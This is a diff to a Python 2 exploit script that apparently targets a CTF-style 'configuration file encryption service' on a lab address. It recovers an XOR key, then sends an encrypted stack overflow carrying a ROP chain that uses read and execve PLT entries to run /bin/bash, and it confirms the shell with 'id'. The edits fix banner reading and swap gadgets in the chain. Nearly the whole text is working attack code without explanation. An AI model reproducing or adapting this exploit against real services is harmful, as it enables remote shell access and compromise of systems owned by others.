@@ -4,11 +4,16 @@ import struct
 import time
 import logging
 
-#logging.basicConfig(level=logging.DEBUG)
+logging.basicConfig(level=logging.DEBUG)
 
-def purge_banner(s):
-  logging.debug(repr(s.recv(1024)))
-  logging.debug(repr(s.recv(1)))
+b1l = len("[-- Enterprise configuration file encryption service --]\n")
+b2l = len("[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")
+
+def purge_banner(s, l):
+  x = "" 
+  while len(x) != l:
+    x += s.recv(l-len(x))
+    logging.debug(repr(x))
 
 def encrypt(p, k):
   # p is char*
@@ -29,7 +34,7 @@ def retrieve_xor_key(s):
   s.send("E")
   s.send(struct.pack("I", len(plain_text)))
   s.send(plain_text)
-  purge_banner(s)
+  purge_banner(s, b2l)
   l = struct.unpack("I", s.recv(4))[0]
   x = s.recv(1024)
   if l != len(x):
@@ -51,37 +56,37 @@ def retrieve_xor_key(s):
 # execve.plt     => 0x080489b6
 # write.got.plt  => 0X0804b3dc
 # write.plt      => 0x080489c0
+# read.plt       => 0x08048860
 
 # Stack layout:
-# [write.plt][&pop-pop-pop-ret][fd(0/1)][&keybuf][size]
+# [read.plt][&pop-pop-pop-ret][fd(0/1)][&keybuf][size]
 # [execve.plt][JUNK][&keybuf][&keybug +20][0x00000000]
 
 # keybuf : "/bin/bash" + "\x00 * 7 +"\x00" * 4 + 0x0804b480 
 # 
 
 s = socket.create_connection(("192.168.122.138", "20002"))
-purge_banner(s)
+purge_banner(s, b1l)
 key = retrieve_xor_key(s)
 logging.debug(key)
 shellcode = "A" * (4096*32) + "B"*16  #"\xb6\x89\x04\x08" + "" + "\x80\xb4\x04\x08" * 2 + "\x00\x00\x00\x00"
-shellcode += "\xc0\x89\x04\x08" + "\x0f\x48\x04\x08" + "\x01\x00\x00\x00" + "\x80\xb4\x04\x08" + "\x18\x00\x00\x00"
+shellcode += "\x60\x88\x04\x08" + "\x0f\x8b\x04\x08" + "\x01\x00\x00\x00" + "\x80\xb4\x04\x08" + "\x18\x00\x00\x00"
 shellcode += "\xb6\x89\x04\x08" + "JUNK" + "\x80\xb4\x04\x08" + "\x94\xb4\x04\x08" + "\x00" * 4
 cipher_shellcode =  encrypt(shellcode, key)
-logging.debug(cipher_shellcode)
+#logging.debug(cipher_shellcode)
 s.send("E")
 s.send(struct.pack("I", len(cipher_shellcode)))
 s.send(cipher_shellcode)
-purge_banner(s)
+purge_banner(s, b2l)
 l = struct.unpack("I", s.recv(4))[0]
+print "reading", l
 x = ""
-print len(shellcode), len(cipher_shellcode)
-while len(x) < len(cipher_shellcode):
-  x += s.recv(128)
-  print len(x)
+while len(x) < l:
+  print "trying to read", l - len(x)
+  x += s.recv(l - len(x))
 print repr(x[-16:])
 s.send("Q")
 s.send("/bin/bash" + "\x00"*7 + "\x00"*4 + "\x80\xb4\x04\x08")
 s.send("id\n")
 print s.recv(1024)
-
 
